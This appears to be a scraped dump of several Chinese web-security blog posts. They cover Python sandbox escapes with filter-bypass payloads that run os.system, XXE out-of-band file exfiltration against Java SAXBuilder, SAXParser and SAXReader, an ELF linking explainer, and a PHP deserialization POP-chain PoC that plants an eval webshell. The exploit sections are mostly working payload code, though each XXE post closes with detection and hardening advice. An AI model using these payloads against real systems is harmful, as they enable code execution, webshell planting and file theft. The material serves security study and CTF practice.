'warnings.catch_warnings'&gt;类很特殊，在内部定义了_module=sys.modules['warnings']，然后warnings模块包含有__builtins__，不具有通用性，本质上跟第一种方法类似for i, sub in enumerate(subclasses): try: more = sub()._module.__builtins__ for f in all_targets: if f in more: print(i, f) except Exception as e: pass 过滤__globals__当__globals__被禁用时， 可以用func_globals直接替换； 使用__getattribute__(‘__globa’+’ls__‘)； 如： 1234567# 原型是调用__globals__''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['__import__']('os').system('calc')# 如果过滤了__globals__，可直接替换为func_globals''.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals['__builtins__']['__import__']('os').system('calc')# 也可以通过拼接字符串得到方式绕过''.__class__.__mro__[2].__subclasses__()[59].__init__.__getattribute__(\"__glo\"+\"bals__\")['__builtins__']['__import__']('os').system('calc') 过滤__mro__或__bases__或__base__两者可互相替换来Bypass其中之一被禁用的情况，但需要注意两者获取object类时的格式区别： 12345678910111213''.__class__.__mro__[2][].__class__.__mro__[1]&#123;&#125;.__class__.__mro__[1]().__class__.__mro__[1][].__class__.__mro__[-1]&#123;&#125;.__class__.__mro__[-1]().__class__.__mro__[-1]&#123;&#125;.__class__.__bases__[0]().__class__.__bases__[0][].__class__.__bases__[0][].__class__.__base__().__class__.__base__&#123;&#125;.__class__.__base__ 如： 123456# 三者互换均可''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['__import__']('os').system('calc')().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['__import__']('os').system('calc')().__class__.__base__.__subclasses__()[59].__init__.__globals__['__builtins__']['__import__']('os').system('calc') base64编码对关键字进行base64编码可绕过一些明文检测机制： 1234567&gt;&gt;&gt; import base64&gt;&gt;&gt; base64.b64encode('__import__')'X19pbXBvcnRfXw=='&gt;&gt;&gt; base64.b64encode('os')'b3M='&gt;&gt;&gt; __builtins__.__dict__['X19pbXBvcnRfXw=='.decode('base64')]('b3M='.decode('base64')).system('calc')0 reload()方法某些情况下，通过del将一些模块的某些方法给删除掉了，但是我们可以通过reload()函数重新加载该模块，从而可以调用删除掉的可利用的方法： 1234567891011&gt;&gt;&gt; __builtins__.__dict__['eval']&lt;built-in function eval&gt;&gt;&gt;&gt; del __builtins__.__dict__['eval']&gt;&gt;&gt; __builtins__.__dict__['eval']Traceback (most recent call last): File \"&lt;stdin&gt;\", line 1, in &lt;module&gt;KeyError: 'eval'&gt;&gt;&gt; reload(__builtins__)&lt;module '__builtin__' (built-in)&gt;&gt;&gt;&gt; __builtins__.__dict__['eval']&lt;built-in function eval&gt; 字符串拼接凡是以字符串形式作为参数的都可以使用拼接的形式来绕过特定关键字的检测。 如： 1''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__bu'+'iltins__']['__impor'+'t__']('o'+'s').system('ca'+'lc') 过滤中括号当中括号[]被过滤掉时， 调用__getitem__()函数直接替换； 调用pop()函数（用于移除列表中的一个元素，默认最后一个元素，并且返回该元素的值）替换； 如： 12345678# 原型''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['__import__']('os').system('calc')# __getitem__()替换中括号[]''.__class__.__mro__.__getitem__(2).__subclasses__().__getitem__(59).__init__.__globals__.__getitem__('__builtins__').__getitem__('__import__')('os').system('calc')# pop()替换中括号[]，结合__getitem__()利用''.__class__.__mro__.__getitem__(2).__subclasses__().pop(59).__init__.__globals__.pop('__builtins__').pop('__import__')('os').system('calc') 0x04 参考Python沙箱逃逸总结 Python 沙箱逃逸 python 沙箱逃逸","tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://www.mi1k7ea.com/tags/Web安全/"},{"name":"Python","slug":"Python","permalink":"https://www.mi1k7ea.com/tags/Python/"},{"name":"沙箱逃逸","slug":"沙箱逃逸","permalink":"https://www.mi1k7ea.com/tags/沙箱逃逸/"}]},{"title":"XML注入之SAXBuilder","date":"2019-05-26T10:46:26.000Z","path":"2019/05/26/XML注入之SAXBuilder/","text":"0x01 何为SAXBuilderSAXBuilder是一个JDOM解析器，能将路径中的XML文件解析为Document对象。 SAXBuilder使用第三方SAX解析器（默认情况下由JAXP选择，或者您可以手动配置）来处理解析任务，并使用SAXHandler的实例来侦听SAX事件，以便使用JDOM内容构造文档一个JDOMFactory。 0x02 常规用法Demo需要下载org.jdom的jar包：http://www.jdom.org/dist/binary/jdom-2.0.6.zip 先定义一个user.xml，用于让DocumentBuilder来解析： 123456&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;user&gt; &lt;name&gt;Mi1k7ea&lt;/name&gt; &lt;sex&gt;male&lt;/sex&gt; &lt;age&gt;20&lt;/age&gt;&lt;/user&gt; Demo代码： 12345678910111213141516171819202122public class test &#123; public static void main(String[] args) throws Exception&#123; File f = new File(\"user.xml\"); saxBuilder(f); &#125; public static void saxBuilder(File f)&#123; try &#123; SAXBuilder saxBuilder = new SAXBuilder(); org.jdom2.Document d = saxBuilder.build(f); Element root = d.getRootElement(); List&lt;Element&gt; childs = root.getChildren(); for (Element child : childs)&#123; String name = child.getName(); String text = child.getText(); System.out.println(name + \":\" + text); &#125; &#125; catch (Exception e)&#123; e.printStackTrace(); &#125; &#125;&#125; 运行后，发现成功解析了user.xml的内容： 0x03 XML注入漏洞验证具体的步骤参考之前的博客《XML注入之DocumentBuilder与XXE攻击防御》，这里不再赘述。 下面只进行无回显外带OOB攻击Demo： 123456789101112131415public class test &#123; public static void main(String[] args) throws Exception&#123; File f = new File(\"user.xml\"); saxBuilder(f); &#125; public static void saxBuilder(File f)&#123; try &#123; SAXBuilder saxBuilder = new SAXBuilder(); org.jdom2.Document d = saxBuilder.build(f); &#125; catch (Exception e)&#123; e.printStackTrace(); &#125; &#125;&#125; ftp.xml 12345678&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY[ &lt;!ENTITY % file SYSTEM &quot;file:///e:/passwd&quot;&gt; &lt;!ENTITY % remote SYSTEM &quot;http://127.0.0.1/xxe/ftp.dtd&quot;&gt; %remote; %all; ]&gt;&lt;root&gt;&amp;send;&lt;/root&gt; ftp.dtd 1&lt;!ENTITY % all &quot;&lt;!ENTITY send SYSTEM &apos;ftp://127.0.0.1:21/%file;&apos;&gt;&quot;&gt; 运行本地FTPServer接收数据： 0x04 检测方法1、在Java项目中搜索org.jdom下的SAXBuilder，排查是否使用了该API解析XML文档内容； 2、若使用了，则进一步排查是否禁用了不安全的操作，具体的是看setFeature()的设置是否存在绕过的可能； 3、除了setFeature()的设置外，检查Reader在read()解析xml数据之前是否采用setEntityResolver()的方式来设置自定义实体解析方式； 0x05 防御方法1234saxBuilder.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", true);saxBuilder.setFeature(\"http://xml.org/sax/features/external-general-entities\", false);saxBuilder.setFeature(\"http://xml.org/sax/features/external-parameter-entities\", false);saxBuilder.setFeature(\"http://apache.org/xml/features/nonvalidating/load-external-dtd\", false);","tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://www.mi1k7ea.com/tags/Web安全/"},{"name":"Java","slug":"Java","permalink":"https://www.mi1k7ea.com/tags/Java/"},{"name":"XML注入","slug":"XML注入","permalink":"https://www.mi1k7ea.com/tags/XML注入/"}]},{"title":"XML注入之SAXParser","date":"2019-05-26T02:09:06.000Z","path":"2019/05/26/XML注入之SAXParser/","text":"0x01 何为SAXParserJava中javax.xml.parsers下的常用的解析XML格式内容的类。 0x02 常规用法Demo先定义一个user.xml，用于让DocumentBuilder来解析： 123456&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;user&gt; &lt;name&gt;Mi1k7ea&lt;/name&gt; &lt;sex&gt;male&lt;/sex&gt; &lt;age&gt;20&lt;/age&gt;&lt;/user&gt; Demo代码： 12345678910111213141516171819public class test &#123; public static void main(String[] args) throws Exception&#123; File f = new File(\"user.xml\"); saxParser(f); &#125; public static void saxParser(File f)&#123; try &#123; SAXParserFactory saxParserFactory = SAXParserFactory.newInstance(); SAXParser saxParser = saxParserFactory.newSAXParser(); MyDefaultHandler defaultHandler = new MyDefaultHandler(); saxParser.parse(f, defaultHandler); char[] c = &#123;&#125;; defaultHandler.characters(c, 0, 1); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125;&#125; 这里输出的话需要自己来写下解析代码，这里示例是继承DefaultHandler类重写characters()方法即可输出： 1234567public class MyDefaultHandler extends DefaultHandler &#123; public void characters (char ch[], int start, int length) throws SAXException &#123; System.out.println(ch); &#125;&#125; 运行后，发现成功解析了user.xml的内容，但是有瑕疵，输出多次了： 0x03 XML注入漏洞验证具体的步骤参考之前的博客《XML注入之DocumentBuilder与XXE攻击防御》，这里不再赘述。 下面只进行无回显外带OOB攻击Demo： 1234567891011121314151617public class test &#123; public static void main(String[] args) throws Exception&#123; File f = new File(\"ftp.xml\"); saxParser(f); &#125; public static void saxParser(File f)&#123; try &#123; SAXParserFactory saxParserFactory = SAXParserFactory.newInstance(); SAXParser saxParser = saxParserFactory.newSAXParser(); MyDefaultHandler defaultHandler = new MyDefaultHandler(); saxParser.parse(f, defaultHandler); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125;&#125; ftp.xml 12345678&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY[ &lt;!ENTITY % file SYSTEM &quot;file:///e:/passwd&quot;&gt; &lt;!ENTITY % remote SYSTEM &quot;http://127.0.0.1/xxe/ftp.dtd&quot;&gt; %remote; %all; ]&gt;&lt;root&gt;&amp;send;&lt;/root&gt; ftp.dtd 1&lt;!ENTITY % all &quot;&lt;!ENTITY send SYSTEM &apos;ftp://127.0.0.1:21/%file;&apos;&gt;&quot;&gt; 运行本地FTPServer接收数据： 0x04 检测方法1、在Java项目中搜索javax.xml.parsers下的SAXParser和SAXParserFactory，排查是否使用了该API解析XML文档内容； 2、若使用了，则进一步排查是否禁用了不安全的操作，具体的是看setFeature()的设置是否存在绕过的可能； 0x05 防御方法1234saxParser.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", true);saxParser.setFeature(\"http://xml.org/sax/features/external-general-entities\", false);saxParser.setFeature(\"http://xml.org/sax/features/external-parameter-entities\", false);saxParser.setFeature(\"http://apache.org/xml/features/nonvalidating/load-external-dtd\", false);","tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://www.mi1k7ea.com/tags/Web安全/"},{"name":"Java","slug":"Java","permalink":"https://www.mi1k7ea.com/tags/Java/"},{"name":"XML注入","slug":"XML注入","permalink":"https://www.mi1k7ea.com/tags/XML注入/"}]},{"title":"XML注入之SAXReader","date":"2019-05-24T13:42:39.000Z","path":"2019/05/24/XML注入之SAXReader/","text":"0x01 何为SAXReader官方描述： Flexible XML framework for Java. 即灵活的Java XML框架，用于解析XML格式的内容。 0x02 常规用法Demo需要下载dom4j的jar包：https://dom4j.github.io/ 先定义一个user.xml，用于让DocumentBuilder来解析： 123456&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;user&gt; &lt;name&gt;Mi1k7ea&lt;/name&gt; &lt;sex&gt;male&lt;/sex&gt; &lt;age&gt;20&lt;/age&gt;&lt;/user&gt; Demo代码： 123456789101112131415161718public class test &#123; public static void main(String[] args) throws Exception&#123; File f = new File(\"user.xml\"); saxReader(f); &#125; public static void saxReader(File f) throws DocumentException&#123; SAXReader saxReader = new SAXReader(); org.dom4j.Document d = saxReader.read(f); Element root = d.getRootElement(); List&lt;Element&gt; childs = root.elements(); for (Element child : childs)&#123; String name = child.getName(); String text = child.getText(); System.out.println(name + \":\" + text); &#125; &#125;&#125; 运行后，发现成功解析了user.xml的内容： 0x03 XML注入漏洞验证具体的步骤参考之前的博客《XML注入之DocumentBuilder与XXE攻击防御》，这里不再赘述。 下面只进行无回显外带OOB攻击Demo： 1234567891011public class test &#123; public static void main(String[] args) throws Exception&#123; File f = new File(\"ftp.xml\"); saxReader(f); &#125; public static void saxReader(File f) throws DocumentException&#123; SAXReader saxReader = new SAXReader(); org.dom4j.Document d = saxReader.read(f); &#125;&#125; ftp.xml 12345678&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY[ &lt;!ENTITY % file SYSTEM &quot;file:///e:/passwd&quot;&gt; &lt;!ENTITY % remote SYSTEM &quot;http://127.0.0.1/xxe/ftp.dtd&quot;&gt; %remote; %all; ]&gt;&lt;root&gt;&amp;send;&lt;/root&gt; ftp.dtd 1&lt;!ENTITY % all &quot;&lt;!ENTITY send SYSTEM &apos;ftp://127.0.0.1:21/%file;&apos;&gt;&quot;&gt; 运行本地FTPServer接收数据： 0x04 检测方法1、在Java项目中搜索org.dom4j下的SAXReader，排查是否使用了该API解析XML文档内容； 2、若使用了，则进一步排查是否禁用了不安全的操作，具体的是看setFeature()的设置是否存在绕过的可能； 3、除了setFeature()的设置外，检查Reader在read()解析xml数据之前是否采用setEntityResolver()的方式来设置自定义实体解析方式； 0x05 防御方法1234saxReader.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", true);saxReader.setFeature(\"http://xml.org/sax/features/external-general-entities\", false);saxReader.setFeature(\"http://xml.org/sax/features/external-parameter-entities\", false);saxReader.setFeature(\"http://apache.org/xml/features/nonvalidating/load-external-dtd\", false);","tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://www.mi1k7ea.com/tags/Web安全/"},{"name":"Java","slug":"Java","permalink":"https://www.mi1k7ea.com/tags/Java/"},{"name":"XML注入","slug":"XML注入","permalink":"https://www.mi1k7ea.com/tags/XML注入/"}]},{"title":"ELF动态链接,PLT和GOT","date":"2019-05-24T13:41:27.000Z","path":"2019/05/24/GOT表-PLT表与动态链接/","text":"当一个程序被加载进内存时，动态链接器会把需要的共享库加载并绑定到该进程的地址空间中。 共享库在被编译到可执行文件中时是位置独立的，因此很容易被重定位到进程的地址空间中。一个共享库就是一个动态的ELF目标文件。在终端输入readelf -h libc.so命令，会看到e_type（ELF文件类型）是ET_DYN。动态目标文件与可执行文件非常类似，是由程序解释器加载的，通常没有PT_INTERP段，因而不会触发程序解释器。 当一个共享库被加载进一个进程的地址空间中时，一定有指向其他共享库的重定位。动态链接器会修改可执行文件中的GOT（Global Offset Table全局偏移表）。GOT位于数据段中（.got.plt节），因为GOT必须是可写的（至少最初是可写的，可以将只读重定位看做是一种安全特性），因而位于数据段中。动态链接器会使用解析好的共享库地址来修改GOT。 0x01 辅助向量通过系统调用sys_execve()将程序加载到内存中时，对应的可执行文件会被映射到内存的地址空间，并为该进程的地址空间分配一个栈。这个栈会用特定的方式向动态链接器传递信息。这种特定的对信息的设置和安排即为辅助向量（auxv）。 如下x86结构中，占地存放了以下信息： 辅助向量是一系列ElfN_auxv_t的结构： 123456789101112131415161718192021222324252627#ifndef HAVE_ELF32_AUXV_T typedef struct &#123; uint32_t a_type; /* Entry type */ union &#123; uint32_t a_val; /* Integer value */ /* We use to have pointer elements added here. We cannot do that, though, since it does not work when using 32-bit definitions on 64-bit platforms and vice versa. */ &#125; a_un; &#125; Elf32_auxv_t; #endif #ifndef HAVE_ELF64_AUXV_T typedef struct &#123; uint64_t a_type; /* Entry type */ union &#123; uint64_t a_val; /* Integer value */ /* We use to have pointer elements added here. We cannot do that, though, since it does not work when using 32-bit definitions on 64-bit platforms and vice versa. */ &#125; a_un; &#125; Elf64_auxv_t; #endif a_type指定了辅助向量的条目类型，a_val为辅助向量的值。 下面是动态链接器所需要的一些最重要的条目类型： 1234567#define AT_EXECFD 2 /* File descriptor of program */#define AT_PHDR 3 /* Program headers for program */#define AT_PHENT 4 /* Size of program header entry */#define AT_PHNUM 5 /* Number of program headers */#define AT_PAGESZ 6 /* System page size */#define AT_ENTRY 9 /* Entry point of program */#define AT_UID 11 /* Real uid */ 动态链接器从栈中检索可执行程序相关的信息，如程序头、程序入口地址等。上面列出的只是从/usr/include/elf.h中挑选出的几个辅助向量条目类型。 辅助向量是由内核函数create_elf_tables()设定的，该函数在Linux的源码/usr/src/linux/fs/binfmt_elf.c中。 内核的执行过程和如下描述类似： sys_execve() 调用do_execve_common() 调用search_binary_handler() 调用load_elf_binary() 调用create_elf_tables() 下面是/usr/src/linux/fs/binfmt_elf.c中的函数create_elf_tables()的代码，这段代码会添加辅助向量条目： 123456NEW_AUX_ENT(AT_PAGESZ, ELF_EXEC_PAGESIZE);NEW_AUX_ENT(AT_PHDR, load_addr + exec-&gt;e_phoff);NEW_AUX_ENT(AT_PHENT, sizeof (struct elf_phdr));NEW_AUX_ENT(AT_PHNUM, exec-&gt;e_phnum);NEW_AUX_ENT(AT_BASE, interp_load_addr);NEW_AUX_ENT(AT_ENTRY, exec-&gt;e_entry); 可以看到，ELF的入口点和程序头地址，以及其他的值，是与内核中的NEW_AUX_ENT()宏一起入栈的。 程序被加载进内存，辅助向量被填充好之后，控制权就交给了动态链接器。动态链接器会解析要链接到进程地址空间的用于共享库的符号和重定位。默认情况下，可执行文件会动态链接GNU C库libc.so。 ldd命令能显示出一个给定的可执行文件所依赖的共享库列表。 0x02 GOT表和PLT表… 0x03 参考","tags":[{"name":"二进制","slug":"二进制","permalink":"https://www.mi1k7ea.com/tags/二进制/"}]},{"title":"PHP对象注入之pop链构造","date":"2019-05-04T07:31:31.000Z","path":"2019/05/04/PHP对象注入之pop链构造/","text":"0x01 pop链我们知道，PHP反序列化漏洞的问题点是出在写得不安全的魔法函数上，有漏洞的魔法函数会让攻击者构造恶意的exp来触发，因为魔法函数会自动调用从而触发漏洞。 但如果漏洞代码不在魔法方法中，而是在一个类的普通方法中，这时就可以通过寻找相同的函数名将类的属性和敏感函数的属性联系起来。因为PHP反序列化可以控制类属性，无论是private还是public。 看个Demo就容易理解了。 12345678910111213141516171819202122232425262728&lt;?phpclass mi1k7ea &#123; protected $ClassObj; function __construct() &#123; $this-&gt;ClassObj = new normal(); &#125; function __destruct() &#123; $this-&gt;ClassObj-&gt;action(); &#125;&#125;class normal &#123; function action() &#123; echo \"hello\"; &#125;&#125;class evil &#123; private $data; function action() &#123; eval($this-&gt;data); &#125;&#125;unserialize($_GET['d']);?&gt; mi1k7ea这个类本来是调用normal类的，而normal类中含有action()方法用于显示字符串，但是现在action()方法在evil类里面也有，所以可以构造pop链，调用evil类中的action()方法。 12345678910111213141516&lt;?phpclass mi1k7ea &#123; protected $ClassObj; function __construct() &#123; $this-&gt;ClassObj = new evil(); &#125;&#125;class evil &#123; private $data = \"phpinfo();\";&#125;$m7 = new mi1k7ea();echo urlencode(serialize($m7));?&gt; 注意的是，protected $ClassObj = new evil();是不行的，还是通过__construct来实例化。 payload： 1O%3A7%3A%22mi1k7ea%22%3A1%3A%7Bs%3A11%3A%22%00%2A%00ClassObj%22%3BO%3A4%3A%22evil%22%3A1%3A%7Bs%3A10%3A%22%00evil%00data%22%3Bs%3A10%3A%22phpinfo%28%29%3B%22%3B%7D%7D 0x02 练习这里看一道pop链题目。 访问页面，显示源码，如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156&lt;?phpclass OutputFilter &#123; protected $matchPattern; protected $replacement; function __construct($pattern, $repl) &#123; $this-&gt;matchPattern = $pattern; $this-&gt;replacement = $repl; &#125; function filter($data) &#123; return preg_replace($this-&gt;matchPattern, $this-&gt;replacement, $data); &#125;&#125;;class LogFileFormat &#123; protected $filters; protected $endl; function __construct($filters, $endl) &#123; $this-&gt;filters = $filters; $this-&gt;endl = $endl; &#125; function format($txt) &#123; foreach ($this-&gt;filters as $filter) &#123; $txt = $filter-&gt;filter($txt); &#125; $txt = str_replace('\\n', $this-&gt;endl, $txt); return $txt; &#125;&#125;;class LogWriter_File &#123; protected $filename; protected $format; function __construct($filename, $format) &#123; $this-&gt;filename = str_replace(\"..\", \"__\", str_replace(\"/\", \"_\", $filename)); $this-&gt;format = $format; &#125; function writeLog($txt) &#123; $txt = $this-&gt;format-&gt;format($txt); //TODO: Modify the address here, and delete this TODO. file_put_contents(\"E:\\\\www\\\\pop\\\\\" . $this-&gt;filename, $txt, FILE_APPEND); &#125;&#125;;class Logger &#123; protected $logwriter; function __construct($writer) &#123; $this-&gt;logwriter = $writer; &#125; function log($txt) &#123; $this-&gt;logwriter-&gt;writeLog($txt); &#125;&#125;;class Song &#123; protected $logger; protected $name; protected $group; protected $url; function __construct($name, $group, $url) &#123; $this-&gt;name = $name; $this-&gt;group = $group; $this-&gt;url = $url; $fltr = new OutputFilter(\"/\\[i\\](.*)\\[\\/i\\]/i\", \"&lt;i&gt;\\\\1&lt;/i&gt;\"); $this-&gt;logger = new Logger(new LogWriter_File(\"song_views\", new LogFileFormat(array($fltr), \"\\n\"))); &#125; function __toString() &#123; return \"&lt;a href='\" . $this-&gt;url . \"'&gt;&lt;i&gt;\" . $this-&gt;name . \"&lt;/i&gt;&lt;/a&gt; by \" . $this-&gt;group; &#125; function log() &#123; $this-&gt;logger-&gt;log(\"Song \" . $this-&gt;name . \" by [i]\" . $this-&gt;group . \"[/i] viewed.\\n\"); &#125; function get_name() &#123; return $this-&gt;name; &#125;&#125;class Lyrics &#123; protected $lyrics; protected $song; function __construct($lyrics, $song) &#123; $this-&gt;song = $song; $this-&gt;lyrics = $lyrics; &#125; function __toString() &#123; return \"&lt;p&gt;\" . $this-&gt;song-&gt;__toString() . \"&lt;/p&gt;&lt;p&gt;\" . str_replace(\"\\n\", \"&lt;br /&gt;\", $this-&gt;lyrics) . \"&lt;/p&gt;\\n\"; &#125; function __destruct() &#123; $this-&gt;song-&gt;log(); &#125; function shortForm() &#123; return \"&lt;p&gt;&lt;a href='song.php?name=\" . urlencode($this-&gt;song-&gt;get_name()) . \"'&gt;\" . $this-&gt;song-&gt;get_name() . \"&lt;/a&gt;&lt;/p&gt;\"; &#125; function name_is($name) &#123; return $this-&gt;song-&gt;get_name() === $name; &#125;&#125;;class User &#123; static function addLyrics($lyrics) &#123; $oldlyrics = array(); if (isset($_COOKIE['lyrics'])) &#123; $oldlyrics = unserialize(base64_decode($_COOKIE['lyrics'])); &#125; foreach ($lyrics as $lyric) $oldlyrics []= $lyric; setcookie('lyrics', base64_encode(serialize($oldlyrics))); &#125; static function getLyrics() &#123; if (isset($_COOKIE['lyrics'])) &#123; return unserialize(base64_decode($_COOKIE['lyrics'])); &#125; else &#123; setcookie('lyrics', base64_encode(serialize(array(1, 2)))); return array(1, 2); &#125; &#125;&#125;;class Porter &#123; static function exportData($lyrics) &#123; return base64_encode(serialize($lyrics)); &#125; static function importData($lyrics) &#123; return serialize(base64_decode($lyrics)); &#125;&#125;;class Conn &#123; protected $conn; function __construct($dbuser, $dbpass, $db) &#123; $this-&gt;conn = mysqli_connect(\"localhost\", $dbuser, $dbpass, $db); &#125; function getLyrics($lyrics) &#123; $r = array(); foreach ($lyrics as $lyric) &#123; $s = intval($lyric); $result = $this-&gt;conn-&gt;query(\"SELECT data FROM lyrics WHERE id=$s\"); while (($row = $result-&gt;fetch_row()) != NULL) &#123; $r []= unserialize(base64_decode($row[0])); &#125; &#125; return $r; &#125; function addLyrics($lyrics) &#123; $ids = array(); foreach ($lyrics as $lyric) &#123; $this-&gt;conn-&gt;query(\"INSERT INTO lyrics (data) VALUES (\\\"\" . base64_encode(serialize($lyric)) . \"\\\")\"); $res = $this-&gt;conn-&gt;query(\"SELECT MAX(id) FROM lyrics\"); $id= $res-&gt;fetch_row(); $ids[]= intval($id[0]); &#125; echo var_dump($ids); return $ids; &#125; function __destruct() &#123; $this-&gt;conn-&gt;close(); $this-&gt;conn = NULL; &#125;&#125;;if (isset($_GET['cmd'])) &#123; unserialize($_GET['cmd']);&#125;else&#123; highlight_file(__FILE__);&#125;?&gt; pop链构造分析分析一下，我们是需要构造pop链触发反序列化漏洞，那就先寻找存在unserialize()函数调用的地方，发现定义的类方法中有3处存在调用unserialize()函数： 12345678910111213141516171819202122232425262728class User &#123; static function addLyrics($lyrics) &#123; $oldlyrics = array(); if (isset($_COOKIE['lyrics'])) &#123; $oldlyrics = unserialize(base64_decode($_COOKIE['lyrics'])); &#125; foreach ($lyrics as $lyric) $oldlyrics []= $lyric; setcookie('lyrics', base64_encode(serialize($oldlyrics))); &#125; static function getLyrics() &#123; if (isset($_COOKIE['lyrics'])) &#123; return unserialize(base64_decode($_COOKIE['lyrics'])); &#125;...class Conn &#123; ... function getLyrics($lyrics) &#123; $r = array(); foreach ($lyrics as $lyric) &#123; $s = intval($lyric); $result = $this-&gt;conn-&gt;query(\"SELECT data FROM lyrics WHERE id=$s\"); while (($row = $result-&gt;fetch_row()) != NULL) &#123; $r []= unserialize(base64_decode($row[0])); &#125; &#125; return $r; &#125;... 其中Conn类中调用的unserialize()函数的参数是通过执行SQL查询获取的，无法直接控制；而User类中两个unserialize()函数的参数都是通过cookie传入的，外部可控，那么切入点就在这里了。 既然知道了哪些类方法的unserialize()函数可控，那就找下可利用的魔法函数有哪些了。浏览了一遍方法，除去构造方法__construct()后，发现有个析构函数__destruct()中调用了该类成员变量的log()方法： 1234567891011class Lyrics &#123; protected $lyrics; protected $song; function __construct($lyrics, $song) &#123; $this-&gt;song = $song; $this-&gt;lyrics = $lyrics; &#125; ... function __destruct() &#123; $this-&gt;song-&gt;log(); &#125; 看到song变量可以通过构造方法直接赋值。那么接下来看看哪些类含有log()方法： 123456789101112131415class Logger &#123; protected $logwriter;// function __construct($writer) &#123; $this-&gt;logwriter = $writer; &#125; function log($txt) &#123;// $this-&gt;logwriter-&gt;writeLog($txt); &#125;&#125;;...class Song &#123; ... function log() &#123; $this-&gt;logger-&gt;log(\"Song \" . $this-&gt;name . \" by [i]\" . $this-&gt;group . \"[/i] viewed.\\n\"); &#125; 发现Logger类和Song类中都有log()方法，看明显看出Logger类的log()方法疑似可利用，因为其中调用了该类logwriter成员变量的writeLog()方法。 下面找下writeLog()方法，发现只有LogWriter_File类中定义了，并且其功能是想指定Web目录路径上写文件： 12345678910111213class LogWriter_File &#123; protected $filename; protected $format; function __construct($filename, $format) &#123; $this-&gt;filename = str_replace(\"..\", \"__\", str_replace(\"/\", \"_\", $filename)); $this-&gt;format = $format; &#125; function writeLog($txt) &#123; $txt = $this-&gt;format-&gt;format($txt); //TODO: Modify the address here, and delete this TODO. file_put_contents(\"E:\\\\www\\\\pop\\\\\" . $this-&gt;filename, $txt, FILE_APPEND); &#125;&#125;; 注意一点就是，这里调用了format()方法对参数进行格式化处理，format()方法的定义在LogFileFormat类中： 123456789101112131415class LogFileFormat &#123; protected $filters; protected $endl; function __construct($filters, $endl) &#123; $this-&gt;filters = $filters; $this-&gt;endl = $endl; &#125; function format($txt) &#123; foreach ($this-&gt;filters as $filter) &#123; $txt = $filter-&gt;filter($txt); &#125; $txt = str_replace('\\n', $this-&gt;endl, $txt); return $txt; &#125;&#125;; 其中又调用了filter()方法过滤内容，然后调用str_replace()方法将换行符替换成endl成员变量的值。 filter()方法是定义在OutputFilter类中，作用是使用成员变量matchPattern的值作为pattern进行正则匹配过滤： 1234567891011class OutputFilter &#123; protected $matchPattern; protected $replacement; function __construct($pattern, $repl) &#123; $this-&gt;matchPattern = $pattern; $this-&gt;replacement = $repl; &#125; function filter($data) &#123; return preg_replace($this-&gt;matchPattern, $this-&gt;replacement, $data); &#125;&#125;; 看到这里，调用了preg_replace()，当PHP版本不高于5.5时可以用正则的/e模式来执行php代码。 最后借lemon大佬个图理一下呗： 触发点1即写shell文件，触发点2即preg_replace()代码注入但限制PHP版本&lt;=5.5。 PoC编写由于本地环境的PHP是5.6，就构造第一个触发点的PoC吧。 poc.php 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051&lt;?phpclass OutputFilter &#123; protected $matchPattern; protected $replacement; function __construct($pattern, $repl) &#123; $this-&gt;matchPattern = $pattern; $this-&gt;replacement = $repl; &#125;&#125;;class LogFileFormat &#123; protected $filters; protected $endl; function __construct($filters, $endl) &#123; $this-&gt;filters = $filters; $this-&gt;endl = $endl; &#125;&#125;;class LogWriter_File &#123; protected $filename; protected $format; function __construct($filename, $format) &#123; $this-&gt;filename = str_replace(\"..\", \"__\", str_replace(\"/\", \"_\", $filename)); $this-&gt;format = $format; &#125;&#125;;class Logger &#123; protected $logwriter; function __construct($writer) &#123; $this-&gt;logwriter = $writer; &#125;&#125;;class Lyrics &#123; protected $lyrics; protected $song; function __construct($lyrics, $song) &#123; $this-&gt;song = $song; $this-&gt;lyrics = $lyrics; &#125;&#125;;$arr = array(new OutputFilter(\"//\", \"&lt;?php @eval(\\$_GET['cmd']);?&gt;\"));$obj1 = new LogFileFormat($arr, '\\n');$obj2 = new LogWriter_File(\"muma.php\", $obj1);$obj3 = new Logger($obj2);$obj = new Lyrics(\"666\", $obj3);echo urlencode(serialize($obj));?&gt; 访问得到poc： 